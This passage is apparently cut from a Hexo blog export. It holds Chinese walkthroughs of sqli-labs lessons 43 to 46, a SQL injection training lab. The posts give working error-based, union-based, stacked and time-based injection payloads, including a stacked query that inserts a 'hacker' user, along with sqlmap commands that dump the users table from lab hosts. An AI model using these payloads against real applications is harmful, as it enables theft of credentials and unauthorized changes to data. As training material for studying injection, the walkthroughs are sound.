--level 2 --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-43/010.png\" alt=\"010\"></p>\n<p><code>sqlmap -r post/post_43.txt -p &quot;login_password&quot; --method=POST --dbms mysql --technique E -v 3 --level 2 --dbs --threads 20</code></p>\n<p><img src=\"/img/sql/Lesson-43/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -r post/post_43.txt -p &quot;login_password&quot; --method=POST --dbms mysql --technique E -v 3 --level 2 -D security --tables --threads 20</code></p>\n<p><img src=\"/img/sql/Lesson-43/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/sql/Lesson-43/013.png\" alt=\"013\"></p>\n<p><img src=\"/img/sql/Lesson-43/014.png\" alt=\"014\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-43-POST基于错误-字符型-堆叠注入变形\"><a href=\"#sqli-labs-lession-43-POST基于错误-字符型-堆叠注入变形\" class=\"headerlink\" title=\"sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形\"></a>sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这一课Lesson-42只是闭合不同。详细分析看上一课。</p>\n<a href=\"/2018/10/21/sqli-labs-lession-42-POST报错注入-字符型-堆叠注入/\" title=\"点击查看Lesson-42\">点击查看Lesson-42</a>\n\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>利用password报错注入。单引号会报错。</p>\n<p><img src=\"/img/sql/Lesson-43/001.png\" alt=\"001\"></p>\n<p>根据报错信息获取数据。这里hackbar没有效果,手动测试。</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>&#39;)and extractvalue(null,concat(0x7e,database(),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-43/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-43/003.png\" alt=\"003\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-43/004.png\" alt=\"0044\"></p>\n<p><img src=\"/img/sql/Lesson-43/005.png\" alt=\"005\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>&#39;)and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-43/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-43/007.png\" alt=\"007\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>&#39;)and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 3,1),0x7e))#</code></p>\n<p><img src=\"/img/sql/Lesson-43/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-43/009.png\" alt=\"009\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><a href=\"/2018/10/21/sqli-labs-lession-42-POST报错注入-字符型-堆叠注入/\" title=\"点击查看Lesson-42\">点击查看Lesson-42</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>用burpsuite抓包</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST <span class=\"regexp\">/sql/</span>Less<span class=\"number\">-43</span><span class=\"regexp\">/login.php HTTP/</span><span class=\"number\">1.1</span></span><br><span class=\"line\"><span class=\"string\">Host:</span> <span class=\"number\">192.168</span><span class=\"number\">.75</span><span class=\"number\">.132</span></span><br><span class=\"line\">User-<span class=\"string\">Agent:</span> Mozilla<span class=\"regexp\">/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/</span><span class=\"number\">20100101</span> Firefox/<span class=\"number\">62.0</span></span><br><span class=\"line\"><span class=\"string\">Accept:</span> text<span class=\"regexp\">/html,application/</span>xhtml+xml,application<span class=\"regexp\">/xml;q=0.9,*/</span>*;q=<span class=\"number\">0.8</span></span><br><span class=\"line\">Accept-<span class=\"string\">Language:</span> en-US,en;q=<span class=\"number\">0.5</span></span><br><span class=\"line\">Accept-<span class=\"string\">Encoding:</span> gzip, deflate</span><br><span class=\"line\"><span class=\"string\">Referer:</span> <span class=\"string\">http:</span><span class=\"comment\">//192.168.75.132/sql/Less-43/</span></span><br><span class=\"line\">Content-<span class=\"string\">Type:</span> application/x-www-form-urlencoded</span><br><span class=\"line\">Content-<span class=\"string\">Length:</span> <span class=\"number\">48</span></span><br><span class=\"line\"><span class=\"string\">Cookie:</span> PHPSESSID=ajc8kb6jotq4mv1n736ni1t624</span><br><span class=\"line\"><span class=\"string\">Connection:</span> close</span><br><span class=\"line\">Upgrade-Insecure-<span class=\"string\">Requests:</span> <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">login_user=<span class=\"number\">123</span>&amp;login_password=<span class=\"number\">123</span>&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -r post/post_43.txt -p &quot;login_password&quot; --method=POST --dbms mysql --technique E -v 3 --level 2 --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-43/010.png\" alt=\"010\"></p>\n<p><code>sqlmap -r post/post_43.txt -p &quot;login_password&quot; --method=POST --dbms mysql --technique E -v 3 --level 2 --dbs --threads 20</code></p>\n<p><img src=\"/img/sql/Lesson-43/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -r post/post_43.txt -p &quot;login_password&quot; --method=POST --dbms mysql --technique E -v 3 --level 2 -D security --tables --threads 20</code></p>\n<p><img src=\"/img/sql/Lesson-43/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/sql/Lesson-43/013.png\" alt=\"013\"></p>\n<p><img src=\"/img/sql/Lesson-43/014.png\" alt=\"014\"></p>\n"},{"title":"sqli-labs lession-44 POST基于错误-字符型-堆叠盲注","date":"2018-10-21T13:07:08.000Z","_content":"\n# sqli-labs lession-44 POST基于错误-字符型-堆叠盲注\n\n---\n\n## 分析\n\n![001](/img/sql/Lesson-44/001.png)\n\n由于是盲注,已经没有报错信息回显了。但是方式还是有的。\n\n## 注入\n\n### 获取列数\n\n`0' union select 1,2,3;#`\n\n![002](/img/sql/Lesson-44/002.png)\n\n![003](/img/sql/Lesson-44/003.png)\n\n### 获取数据库名\n\n`0' union select 1,database(),3;#`\n\n![004](/img/sql/Lesson-44/004.png)\n\n![005](/img/sql/Lesson-44/005.png)\n\n### 获取表名\n\n`0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3;#`\n\n![006](/img/sql/Lesson-44/006.png)\n\n![007](/img/sql/Lesson-44/007.png)\n\n### 获取列名\n\n`0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),3;#`\n\n![008](/img/sql/Lesson-44/008.png)\n\n![009](/img/sql/Lesson-44/009.png)\n\n### 获取字段\n\n`0' union select 1,(select group_concat(id,0x7e,username,0x7e,password) from users),3;#`\n\n![0110](/img/sql/Lesson-44/010.png)\n\n![011](/img/sql/Lesson-44/011.png)\n\n## 堆叠注入\n\n插入用户\n\n`0';INSERT INTO users(username, password) VALUES (\"hacker\", \"123456\");#`\n\n![012](/img/sql/Lesson-44/012.png)\n\n插入用户成功。\n\n## SQLMAP\n\n![013](/img/sql/Lesson-44/013.png)\n\n`sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 --flush-session --fresh-queries -v 3`\n\n![014](/img/sql/Lesson-44/014.png)\n\n找到payload之后直接上结果吧。\n\n`sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 -D security -T users --columns --dump`\n\n![015](/img/sql/Lesson-44/015.png)","source":"_posts/sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注.md","raw":"---\ntitle: sqli-labs lession-44 POST基于错误-字符型-堆叠盲注\ndate: 2018-10-21 21:07:08\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-44 POST基于错误-字符型-堆叠盲注\n\n---\n\n## 分析\n\n![001](/img/sql/Lesson-44/001.png)\n\n由于是盲注,已经没有报错信息回显了。但是方式还是有的。\n\n## 注入\n\n### 获取列数\n\n`0' union select 1,2,3;#`\n\n![002](/img/sql/Lesson-44/002.png)\n\n![003](/img/sql/Lesson-44/003.png)\n\n### 获取数据库名\n\n`0' union select 1,database(),3;#`\n\n![004](/img/sql/Lesson-44/004.png)\n\n![005](/img/sql/Lesson-44/005.png)\n\n### 获取表名\n\n`0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3;#`\n\n![006](/img/sql/Lesson-44/006.png)\n\n![007](/img/sql/Lesson-44/007.png)\n\n### 获取列名\n\n`0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),3;#`\n\n![008](/img/sql/Lesson-44/008.png)\n\n![009](/img/sql/Lesson-44/009.png)\n\n### 获取字段\n\n`0' union select 1,(select group_concat(id,0x7e,username,0x7e,password) from users),3;#`\n\n![0110](/img/sql/Lesson-44/010.png)\n\n![011](/img/sql/Lesson-44/011.png)\n\n## 堆叠注入\n\n插入用户\n\n`0';INSERT INTO users(username, password) VALUES (\"hacker\", \"123456\");#`\n\n![012](/img/sql/Lesson-44/012.png)\n\n插入用户成功。\n\n## SQLMAP\n\n![013](/img/sql/Lesson-44/013.png)\n\n`sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 --flush-session --fresh-queries -v 3`\n\n![014](/img/sql/Lesson-44/014.png)\n\n找到payload之后直接上结果吧。\n\n`sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 -D security -T users --columns --dump`\n\n![015](/img/sql/Lesson-44/015.png)","slug":"sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注","published":1,"updated":"2019-06-19T17:23:13.394Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istf0005m4dsb1vjwoz5h","content":"<h1 id=\"sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注\"><a href=\"#sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注\" class=\"headerlink\" title=\"sqli-labs lession-44 POST基于错误-字符型-堆叠盲注\"></a>sqli-labs lession-44 POST基于错误-字符型-堆叠盲注</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-44/001.png\" alt=\"001\"></p>\n<p>由于是盲注,已经没有报错信息回显了。但是方式还是有的。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"获取列数\"><a href=\"#获取列数\" class=\"headerlink\" title=\"获取列数\"></a>获取列数</h3><p><code>0&#39; union select 1,2,3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-44/003.png\" alt=\"003\"></p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>0&#39; union select 1,database(),3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-44/005.png\" alt=\"005\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>0&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-44/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>0&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-44/009.png\" alt=\"009\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>0&#39; union select 1,(select group_concat(id,0x7e,username,0x7e,password) from users),3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/010.png\" alt=\"0110\"></p>\n<p><img src=\"/img/sql/Lesson-44/011.png\" alt=\"011\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p>插入用户</p>\n<p><code>0&#39;;INSERT INTO users(username, password) VALUES (&quot;hacker&quot;, &quot;123456&quot;);#</code></p>\n<p><img src=\"/img/sql/Lesson-44/012.png\" alt=\"012\"></p>\n<p>插入用户成功。</p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><img src=\"/img/sql/Lesson-44/013.png\" alt=\"013\"></p>\n<p><code>sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 --flush-session --fresh-queries -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-44/014.png\" alt=\"014\"></p>\n<p>找到payload之后直接上结果吧。</p>\n<p><code>sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-44/015.png\" alt=\"015\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注\"><a href=\"#sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注\" class=\"headerlink\" title=\"sqli-labs lession-44 POST基于错误-字符型-堆叠盲注\"></a>sqli-labs lession-44 POST基于错误-字符型-堆叠盲注</h1><hr>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-44/001.png\" alt=\"001\"></p>\n<p>由于是盲注,已经没有报错信息回显了。但是方式还是有的。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"获取列数\"><a href=\"#获取列数\" class=\"headerlink\" title=\"获取列数\"></a>获取列数</h3><p><code>0&#39; union select 1,2,3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-44/003.png\" alt=\"003\"></p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>0&#39; union select 1,database(),3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-44/005.png\" alt=\"005\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>0&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-44/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>0&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-44/009.png\" alt=\"009\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>0&#39; union select 1,(select group_concat(id,0x7e,username,0x7e,password) from users),3;#</code></p>\n<p><img src=\"/img/sql/Lesson-44/010.png\" alt=\"0110\"></p>\n<p><img src=\"/img/sql/Lesson-44/011.png\" alt=\"011\"></p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p>插入用户</p>\n<p><code>0&#39;;INSERT INTO users(username, password) VALUES (&quot;hacker&quot;, &quot;123456&quot;);#</code></p>\n<p><img src=\"/img/sql/Lesson-44/012.png\" alt=\"012\"></p>\n<p>插入用户成功。</p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><img src=\"/img/sql/Lesson-44/013.png\" alt=\"013\"></p>\n<p><code>sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 --flush-session --fresh-queries -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-44/014.png\" alt=\"014\"></p>\n<p>找到payload之后直接上结果吧。</p>\n<p><code>sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-44/015.png\" alt=\"015\"></p>\n"},{"title":"sqli-labs lession-45 POST基于错误-字符型-堆叠盲注","date":"2018-10-30T03:59:48.000Z","_content":"\n# sqli-labs lession-45 POST基于错误-字符型-堆叠盲注\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-45/001.png)\n\n## 分析\n\n源代码与Lesson-44只有闭合方式不同。\n\n## 注入\n\n### 判断类型\n\n同样还是在password注入。依旧是盲注。\n\n`') or 1=1 and if(1,sleep(5),null)#`\n\n通过时间函数函数来判断闭合为`')'`\n\n### 判断字段数\n\n`') or 1=2 union select 1,2,3#`\n\n![002](/img/sql/Lesson-45/002.png)\n\n![003](/img/sql/Lesson-45/003.png)\n\n### 判断当前数据库\n\n`') or 1=2 union select 1,database(),3#`\n\n![004](/img/sql/Lesson-45/004.png)\n\n![005](/source/img/sql/Lesson-45/005.png)\n\n接下来的爆数据库的流程都一样,具体可以看Lesson-44.\n\n{% post_link sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注 点击查看Lesson-44 %}\n\n## 堆叠注入\n\n{% post_link sqli-labs-lession-42-POST报错注入-字符型-堆叠注入 点击查看Lesson-42%}\n\n## SQLMAP\n\n`sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 --flush-session --fresh-queries -v 3`\n\n![006](/img/sql/Lesson-45/006.png)\n\n盲注时间太长了,直接上结果。\n\n`sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 -D security -T users --columns --dump`\n\n![007](/img/sql/Lesson-45/007.png)\n\n![008](/img/sql/Lesson-45/008.png)\n\n\n\n\n","source":"_posts/sqli-labs-lession-45-POST基于错误-字符型-堆叠盲注.md","raw":"---\ntitle: sqli-labs lession-45 POST基于错误-字符型-堆叠盲注\ndate: 2018-10-30 11:59:48\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-45 POST基于错误-字符型-堆叠盲注\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-45/001.png)\n\n## 分析\n\n源代码与Lesson-44只有闭合方式不同。\n\n## 注入\n\n### 判断类型\n\n同样还是在password注入。依旧是盲注。\n\n`') or 1=1 and if(1,sleep(5),null)#`\n\n通过时间函数函数来判断闭合为`')'`\n\n### 判断字段数\n\n`') or 1=2 union select 1,2,3#`\n\n![002](/img/sql/Lesson-45/002.png)\n\n![003](/img/sql/Lesson-45/003.png)\n\n### 判断当前数据库\n\n`') or 1=2 union select 1,database(),3#`\n\n![004](/img/sql/Lesson-45/004.png)\n\n![005](/source/img/sql/Lesson-45/005.png)\n\n接下来的爆数据库的流程都一样,具体可以看Lesson-44.\n\n{% post_link sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注 点击查看Lesson-44 %}\n\n## 堆叠注入\n\n{% post_link sqli-labs-lession-42-POST报错注入-字符型-堆叠注入 点击查看Lesson-42%}\n\n## SQLMAP\n\n`sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 --flush-session --fresh-queries -v 3`\n\n![006](/img/sql/Lesson-45/006.png)\n\n盲注时间太长了,直接上结果。\n\n`sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 -D security -T users --columns --dump`\n\n![007](/img/sql/Lesson-45/007.png)\n\n![008](/img/sql/Lesson-45/008.png)\n\n\n\n\n","slug":"sqli-labs-lession-45-POST基于错误-字符型-堆叠盲注","published":1,"updated":"2019-06-19T17:23:13.394Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istf1005p4dsb0a5xggt2","content":"<h1 id=\"sqli-labs-lession-45-POST基于错误-字符型-堆叠盲注\"><a href=\"#sqli-labs-lession-45-POST基于错误-字符型-堆叠盲注\" class=\"headerlink\" title=\"sqli-labs lession-45 POST基于错误-字符型-堆叠盲注\"></a>sqli-labs lession-45 POST基于错误-字符型-堆叠盲注</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-45/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>源代码与Lesson-44只有闭合方式不同。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>同样还是在password注入。依旧是盲注。</p>\n<p><code>&#39;) or 1=1 and if(1,sleep(5),null)#</code></p>\n<p>通过时间函数函数来判断闭合为<code>&#39;)&#39;</code></p>\n<h3 id=\"判断字段数\"><a href=\"#判断字段数\" class=\"headerlink\" title=\"判断字段数\"></a>判断字段数</h3><p><code>&#39;) or 1=2 union select 1,2,3#</code></p>\n<p><img src=\"/img/sql/Lesson-45/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-45/003.png\" alt=\"003\"></p>\n<h3 id=\"判断当前数据库\"><a href=\"#判断当前数据库\" class=\"headerlink\" title=\"判断当前数据库\"></a>判断当前数据库</h3><p><code>&#39;) or 1=2 union select 1,database(),3#</code></p>\n<p><img src=\"/img/sql/Lesson-45/004.png\" alt=\"004\"></p>\n<p><img src=\"/source/img/sql/Lesson-45/005.png\" alt=\"005\"></p>\n<p>接下来的爆数据库的流程都一样,具体可以看Lesson-44.</p>\n<a href=\"/2018/10/21/sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注/\" title=\"点击查看Lesson-44\">点击查看Lesson-44</a>\n\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><a href=\"/2018/10/21/sqli-labs-lession-42-POST报错注入-字符型-堆叠注入/\" title=\"点击查看Lesson-42\">点击查看Lesson-42</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 --flush-session --fresh-queries -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-45/006.png\" alt=\"006\"></p>\n<p>盲注时间太长了,直接上结果。</p>\n<p><code>sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-45/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/sql/Lesson-45/008.png\" alt=\"008\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-45-POST基于错误-字符型-堆叠盲注\"><a href=\"#sqli-labs-lession-45-POST基于错误-字符型-堆叠盲注\" class=\"headerlink\" title=\"sqli-labs lession-45 POST基于错误-字符型-堆叠盲注\"></a>sqli-labs lession-45 POST基于错误-字符型-堆叠盲注</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-45/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>源代码与Lesson-44只有闭合方式不同。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>同样还是在password注入。依旧是盲注。</p>\n<p><code>&#39;) or 1=1 and if(1,sleep(5),null)#</code></p>\n<p>通过时间函数函数来判断闭合为<code>&#39;)&#39;</code></p>\n<h3 id=\"判断字段数\"><a href=\"#判断字段数\" class=\"headerlink\" title=\"判断字段数\"></a>判断字段数</h3><p><code>&#39;) or 1=2 union select 1,2,3#</code></p>\n<p><img src=\"/img/sql/Lesson-45/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-45/003.png\" alt=\"003\"></p>\n<h3 id=\"判断当前数据库\"><a href=\"#判断当前数据库\" class=\"headerlink\" title=\"判断当前数据库\"></a>判断当前数据库</h3><p><code>&#39;) or 1=2 union select 1,database(),3#</code></p>\n<p><img src=\"/img/sql/Lesson-45/004.png\" alt=\"004\"></p>\n<p><img src=\"/source/img/sql/Lesson-45/005.png\" alt=\"005\"></p>\n<p>接下来的爆数据库的流程都一样,具体可以看Lesson-44.</p>\n<a href=\"/2018/10/21/sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注/\" title=\"点击查看Lesson-44\">点击查看Lesson-44</a>\n\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><a href=\"/2018/10/21/sqli-labs-lession-42-POST报错注入-字符型-堆叠注入/\" title=\"点击查看Lesson-42\">点击查看Lesson-42</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 --flush-session --fresh-queries -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-45/006.png\" alt=\"006\"></p>\n<p>盲注时间太长了,直接上结果。</p>\n<p><code>sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-45/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/sql/Lesson-45/008.png\" alt=\"008\"></p>\n"},{"title":"sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入","date":"2018-11-04T09:21:03.000Z","_content":"\n# sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-46/001.png)\n\n## 分析\n\n本关的sql语句就是下面的了\n\n`$sql = \"SELECT * FROM users ORDER BY $id\";`\n\n```\norder by 可以加字段名，表达式和字段的位置，字段的位置需要是整数型。不可以跟union。\nORDER BY {col_name | expr | position} \n```\n\norder在之前是用来判断列数的,这里照样。\n\n![002](/img/sql/Lesson-46/002.png)\n\n![003](/img/sql/Lesson-46/003.png)\n\n数字型的当输入正常的列数时会根据列进行排序。\n\n![004](/img/sql/Lesson-46/004.png)\n\n## 注入过程\n\n### 判断字符型\n\n通过desc或者asc排序判断。\n\n![005](/img/sql/Lesson-46/005.png)\n\n判断为数字型\n\n### 报错注入\n\n\n\n本课是有报错的,可以利用报错注入\n\n`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))`\n\n![006](/img/sql/Lesson-46/006.png)\n\n`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e))`\n\n![007](/img/sql/Lesson-46/007.png)\n\n`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e))`\n\n![008](/img/sql/Lesson-46/008.png)\n\n`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password) from security.users limit 0,1),0x7e))`\n\n![009](/img/sql/Lesson-46/009.png)\n\n### 时间盲注\n\npayload:\n\n`10.60.250.60/sql/Less-46/?sort=1 and if(1=2, sleep(1), null)`\n\n## SQLMAP\n\n`sqlmap -u 